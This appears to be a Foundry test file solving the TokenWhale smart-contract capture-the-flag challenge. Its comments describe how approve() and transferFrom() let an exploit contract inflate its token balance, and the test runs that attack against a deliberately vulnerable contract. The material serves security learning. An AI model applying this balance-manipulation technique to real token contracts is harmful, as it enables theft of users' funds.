// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {TokenWhale, ExploitContract} from "../src/TokenWhale.sol";

/**
 * @title TokenWhale Exploit Test
 * @notice Demonstrates exploitation of token manipulation logic
 *
 * @dev The vulnerability exists because:
 * - The contract allows manipulation of token balances through `approve()` and `transferFrom()`
 * - `ExploitContract` can increase its token balance to meet the challenge completion condition
 *
 * Attack flow:
 * 1. `ExploitContract` interacts with `TokenWhale`
 * 2. Calls `approve()` and `transferFrom()` to manipulate token balances
 * 3. Calls `transfer()` to transfer 1,000,000 tokens, achieving the challenge completion condition
 */
contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    address constant Alice = address(0x5E12E7);
    address constant Bob = address(0x5311E8);
    address constant Pete = address(0x5E41E9);

    function setUp() public {
        tokenWhale = new TokenWhale(address(this));
        exploitContract = new ExploitContract(tokenWhale);
    }

    function testExploit() public {
        tokenWhale.transfer(address(exploitContract), 100);
        tokenWhale.approve(address(exploitContract), 900);
        exploitContract.transfer(900);
        _checkSolved();
    }

    function _checkSolved() internal view {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
